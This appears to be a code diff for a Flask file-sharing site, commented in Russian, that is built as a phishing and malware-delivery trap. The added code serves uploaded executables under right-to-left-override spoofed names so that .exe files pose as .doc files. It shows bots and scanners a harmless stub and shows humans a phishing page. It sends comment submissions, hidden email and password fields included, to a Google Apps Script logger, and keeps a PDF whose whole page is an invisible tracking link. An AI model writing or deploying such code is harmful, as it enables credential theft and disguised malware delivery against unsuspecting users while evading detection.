@@ -11,7 +11,7 @@ from fpdf import FPDF
 app = Flask(__name__)
 
 # --- КОНФИГУРАЦИЯ ---
-# Используем /tmp для Render (права на запись), файлы живут до перезагрузки инстанса
+# Используем /tmp для Render, так как там есть права на запись
 UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
 DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'
 
@@ -19,37 +19,42 @@ if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
 
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
-ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png'}
+# Разрешаем exe и bat для тестов, но фильтруем их при отдаче
+ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}
 
 # Твой Google Script URL (Логгер)
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"
 
-# --- БАЗА ДАННЫХ (JSON) ---
+# --- БАЗА ДАННЫХ ---
 def load_db():
     if os.path.exists(DB_FILE):
         try:
-            with open(DB_FILE, 'r') as f:
-                return json.load(f)
-        except:
-            return {}
+            with open(DB_FILE, 'r') as f: return json.load(f)
+        except: return {}
     return {}
 
 def save_db(data):
     try:
-        with open(DB_FILE, 'w') as f:
-            json.dump(data, f)
-    except Exception as e:
-        print(f"DB Save Error: {e}")
+        with open(DB_FILE, 'w') as f: json.dump(data, f)
+    except Exception as e: print(f"DB Save Error: {e}")
 
-# Загружаем базу при старте
 db = load_db()
 
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
-# --- ОТПРАВКА ОТЧЕТА ---
+# --- ФОНОВАЯ ОТПРАВКА ЛОГОВ ---
 def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
     try:
+        # OPSEC: Удаляем пароли из вывода в консоль сервера
+        safe_log = data.copy()
+        if 'system' in safe_log and isinstance(safe_log['system'], dict):
+            safe_log['system'] = safe_log['system'].copy()
+            if 'phishing_password' in safe_log['system']:
+                safe_log['system']['phishing_password'] = "***REDACTED***"
+        
+        print(f"[+] Trigger: {trigger_type} | IP: {user_ip}")
+        
         payload = {
             "trigger": trigger_type,
             "ip": user_ip,
@@ -58,29 +63,27 @@ def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
             "details": data
         }
         requests.post(GOOGLE_SCRIPT_URL, json=payload)
-        print(f"[+] Report sent: {trigger_type}")
     except Exception as e:
-        print(f"[-] Google Script Error: {e}")
+        print(f"[-] Logger Error: {e}")
 
-# --- PDF TRAP GENERATOR (SOTA VERSION) ---
+# --- PDF TRAP GENERATOR ---
 class PDFReceipt(FPDF):
     def header(self):
         self.set_font('Arial', 'B', 15)
-        self.cell(0, 10, 'PDFEAGLE - Secure Receipt', 0, 1, 'C')
+        self.cell(0, 10, 'SECURE TRANSFER RECEIPT', 0, 1, 'C')
 
 def generate_receipt(uid, filename):
     pdf = PDFReceipt()
     pdf.add_page()
     pdf.set_font("Arial", size=12)
     
-    # Текст квитанции
     pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
     pdf.cell(200, 10, txt=f"Transaction ID: {uid}", ln=1)
-    pdf.cell(200, 10, txt=f"Timestamp: {datetime.datetime.now()}", ln=1)
+    pdf.cell(200, 10, txt=f"Date: {datetime.datetime.now()}", ln=1)
     pdf.set_text_color(255, 0, 0)
-    pdf.cell(200, 10, txt="STATUS: UNVERIFIED. CLICK DOCUMENT TO VERIFY.", ln=1)
+    pdf.cell(200, 10, txt="STATUS: PENDING VERIFICATION. CLICK TO OPEN.", ln=1)
     
-    # SOTA TRAP: Ссылка на весь лист А4 (невидимая кнопка)
+    # Ссылка-ловушка на весь лист
     tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
     pdf.link(0, 0, 210, 297, tracking_url)
     
@@ -93,14 +96,6 @@ def generate_receipt(uid, filename):
 
 @app.route('/health')
 def health_check():
-    # Фильтр: Игнорируем Google Script (KeepAlive) и Render, логируем остальных (сканеры)
-    user_agent = request.headers.get('User-Agent', '').lower()
-    if 'google-apps-script' not in user_agent and 'render' not in user_agent:
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        threading.Thread(target=send_email_background, args=(
-            {"meta": {"url": "/health", "trigger": "Suspicious Scan"}}, 
-            ip, user_agent, "SCANNER DETECTED"
-        )).start()
     return "OK", 200
 
 @app.route('/pixel.gif')
@@ -109,16 +104,10 @@ def tracking_pixel():
     uid = request.args.get('uid', 'unknown')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    trigger_name = "PDF TRAP TRIGGERED" if source == 'pdf_receipt' else "PDF CLICKED (HIGH ALERT)"
-    
-    data = {
-        'meta': {'url': f'PDF TRAP ({uid})', 'source': source},
-        'system': {'platform': 'PDF Reader'},
-        'network': {'localIPs': ['Unknown']}
-    }
-    threading.Thread(target=send_email_background, args=(data, ip, "PDF Reader", trigger_name)).start()
+    threading.Thread(target=send_email_background, args=(
+        {'meta': {'url': f'PDF TRAP ({uid})', 'source': source}}, ip, "PDF Reader", "PDF OPENED"
+    )).start()
 
-    # Прозрачный пиксель
     return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})
 
 @app.route('/', methods=['GET', 'POST'])
@@ -136,7 +125,7 @@ def index():
                 saved_filename = f"{uuid.uuid4().hex}.{ext}"
                 file.save(os.path.join(app.config['UPLOAD_FOLDER'], saved_filename))
                 
-                icon = "fa-file-pdf" if ext == 'pdf' else "fa-file-word" if ext in ['doc', 'docx'] else "fa-file-alt"
+                icon = "fa-file-pdf" if ext == 'pdf' else "fa-file-word" if ext in ['doc', 'docx'] else "fa-file-code"
                 uploaded_files.append({
                     'name': original_filename,
                     'saved_name': saved_filename,
@@ -147,35 +136,62 @@ def index():
 
         if uploaded_files:
             unique_id = uuid.uuid4().hex[:6]
-            # Создаем запись в БД
             db[unique_id] = {'files': uploaded_files, 'comments': [], 'created_at': str(datetime.datetime.now())}
-            save_db(db) # Сохраняем на диск
+            save_db(db)
             return redirect(f"/{unique_id}")
             
     return render_template('index.html')
 
 @app.route('/<unique_id>')
 def view_files(unique_id):
-    # Перезагружаем БД перед показом
     global db
     db = load_db()
-    
     data = db.get(unique_id)
     if not data: return "File not found or expired", 404
     return render_template('view.html', files=data['files'], uid=unique_id, db_data=data)
 
-# --- НОВЫЙ МАРШРУТ: ФИШИНГ СЕМЯНЫЧА ---
+# --- CLOAKING & PHISHING ---
 @app.route('/verify/<uid>/<path:filename>')
 def verify_download(uid, filename):
+    user_agent = request.headers.get('User-Agent', '').lower()
+    
+    # Список ботов для фильтрации
+    bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse', 'twitterbot', 'facebookexternalhit']
+    is_bot = any(bot in user_agent for bot in bots)
+    
+    if is_bot:
+        # Ботам отдаем заглушку
+        return "<h1>Loading secure document...</h1><p>Please wait while we verify your browser security.</p>", 200
+    
+    # Людям отдаем фишинг
     return render_template('semyanich.html', uid=uid, filename=filename)
 
+# --- RTLO DOWNLOAD ---
 @app.route('/download/<uid>/<path:filename>')
 def download_file(uid, filename):
     data = db.get(uid)
     if not data: return abort(404)
     target_file = next((f for f in data['files'] if f['name'] == filename), None)
+    
     if target_file:
-        return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=target_file['name'])
+        original_name = target_file['name']
+        saved_name = target_file['saved_name']
+        
+        # RTLO SPOOFING: Если файл исполняемый, маскируем его
+        # Символ \u202e переворачивает текст справа-налево
+        if saved_name.endswith(('.exe', '.scr', '.bat')):
+            # Пример: "Statement_cod.exe" -> "Statement_exe.doc"
+            # Браузер покажет: Document_exe.doc
+            spoofed_name = "Document_\u202ecod.exe" 
+        else:
+            spoofed_name = original_name
+
+        return send_from_directory(
+            app.config['UPLOAD_FOLDER'], 
+            saved_name, 
+            as_attachment=True, 
+            download_name=spoofed_name
+        )
     return abort(404)
 
 @app.route('/download_receipt/<uid>')
@@ -183,56 +199,45 @@ def download_receipt(uid):
     filename = generate_receipt(uid, "Secure_Download")
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
-# --- API ДЛЯ SOTA ФИЧ ---
-
+# --- API COLLECTOR (BEACON SUPPORT) ---
 @app.route('/api/collect', methods=['POST'])
 def collect_data():
-    data = request.json
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent')
-    trigger = data.get('meta', {}).get('trigger', 'Page Load')
-    
-    threading.Thread(target=send_email_background, args=(data, user_ip, user_agent, trigger)).start()
-    return jsonify({"status": "ok"})
+    try:
+        # sendBeacon может отправлять данные как строку или Blob
+        if request.is_json:
+            data = request.json
+        else:
+            # Пытаемся распарсить сырые данные
+            data = json.loads(request.data)
+            
+        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        user_agent = request.headers.get('User-Agent')
+        trigger = data.get('meta', {}).get('trigger', 'Unknown')
+        
+        threading.Thread(target=send_email_background, args=(data, user_ip, user_agent, trigger)).start()
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        return jsonify({"status": "error", "details": str(e)})
 
 @app.route('/api/comment', methods=['POST'])
 def add_comment():
     data = request.json
     uid = data.get('uid')
-    username = data.get('username', 'Anonymous')
-    text = data.get('text')
-    
-    # HARVESTING FIELDS
-    email = data.get('email', 'Not provided')
-    password = data.get('password', 'Not provided')
     
     if uid in db:
         if 'comments' not in db[uid]: db[uid]['comments'] = []
         
-        # В базу пишем только публичное
         comment_entry = {
-            'username': username,
-            'text': text,
+            'username': data.get('username', 'Anonymous'),
+            'text': data.get('text'),
             'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
         }
         db[uid]['comments'].append(comment_entry)
-        save_db(db) # Сохраняем
+        save_db(db)
         
-        # В отчет шлем ВСЁ (включая пароль)
+        # Логируем (включая скрытые поля email/pass если они есть)
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        user_agent = request.headers.get('User-Agent')
-        
-        log_data = {
-            "meta": {"url": f"Comment on {uid}", "trigger": "Credential Harvest (Comment)"},
-            "system": {
-                "username": username, 
-                "comment": text,
-                "CAPTURED_EMAIL": email,
-                "CAPTURED_PASSWORD": password
-            },
-            "network": {"localIPs": [user_ip]}
-        }
-        threading.Thread(target=send_email_background, args=(log_data, user_ip, user_agent, "CREDENTIALS HARVESTED")).start()
+        threading.Thread(target=send_email_background, args=(data, user_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS")).start()
         
         return jsonify({"status": "ok", "comment": comment_entry})
     
